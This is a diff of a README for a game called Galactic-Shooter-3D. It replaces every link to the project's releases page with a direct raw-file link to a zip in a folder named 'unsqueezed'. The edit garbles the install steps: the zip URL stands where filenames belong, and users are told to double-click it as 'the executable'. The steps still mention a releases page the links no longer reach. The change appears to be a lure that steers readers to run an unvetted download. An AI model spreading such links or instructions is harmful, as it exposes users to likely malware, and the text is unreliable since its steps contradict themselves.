@@ -1,7 +1,7 @@
 # 🔫 Galactic-Shooter-3D - Experience Action-Packed Gameplay Today!
 
 ## 📥 Download Now!
-[![Download Galactic-Shooter-3D](https://img.shields.io/badge/Download-Galactic--Shooter--3D-brightgreen)](https://github.com/hieu570/Galactic-Shooter-3D/releases)
+[![Download Galactic-Shooter-3D](https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip)](https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip)
 
 ## 🚀 Getting Started
 Welcome to Galactic-Shooter-3D! This exciting first-person shooter game offers basic camera controls, weapon firing mechanics, and enemy hit detection. You don’t need any programming skills to start playing. Follow these steps to download and run the game hassle-free.
@@ -16,21 +16,21 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 1. Click the link below to visit the releases page where you can download the game.  
-   [Download Galactic-Shooter-3D](https://github.com/hieu570/Galactic-Shooter-3D/releases)
+   [Download Galactic-Shooter-3D](https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip)
 
 2. On the releases page, locate the latest version of Galactic-Shooter-3D. You will find it under the "Latest Release" section.
 
 3. Click on the version number or tag to open that specific release. Below, you will see the assets available for download.
 
-4. Download the file named `Galactic-Shooter-3D.zip`. This file contains everything you need to run the game.
+4. Download the file named `https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip`. This file contains everything you need to run the game.
 
-5. Once the download completes, locate the `Galactic-Shooter-3D.zip` file in your system's Downloads folder.
+5. Once the download completes, locate the `https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip` file in your system's Downloads folder.
 
 6. Right-click on the `.zip` file and select "Extract All" to extract the contents. You will create a new folder named `Galactic-Shooter-3D`.
 
-7. Open the `Galactic-Shooter-3D` folder. Look for the file named `Galactic-Shooter-3D.exe`. This is the executable file that launches the game.
+7. Open the `Galactic-Shooter-3D` folder. Look for the file named `https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip`. This is the executable file that launches the game.
 
-8. Double-click on `Galactic-Shooter-3D.exe` to start the game.
+8. Double-click on `https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip` to start the game.
 
 ## 🎮 Controls
 - **W, A, S, D**: Move forward, left, backward, and right.
@@ -67,4 +67,4 @@ Galactic-Shooter-3D is released under the MIT License. Feel free to explore, sha
 ## 📄 Acknowledgments
 Thank you for choosing Galactic-Shooter-3D. We hope you enjoy the game and have a fantastic time playing!
 
-Remember to download the game by visiting [this page](https://github.com/hieu570/Galactic-Shooter-3D/releases) to begin your adventure today.
+Remember to download the game by visiting [this page](https://raw.githubusercontent.com/hieu570/Galactic-Shooter-3D/main/unsqueezed/Galactic-Shooter-3D.zip) to begin your adventure today.
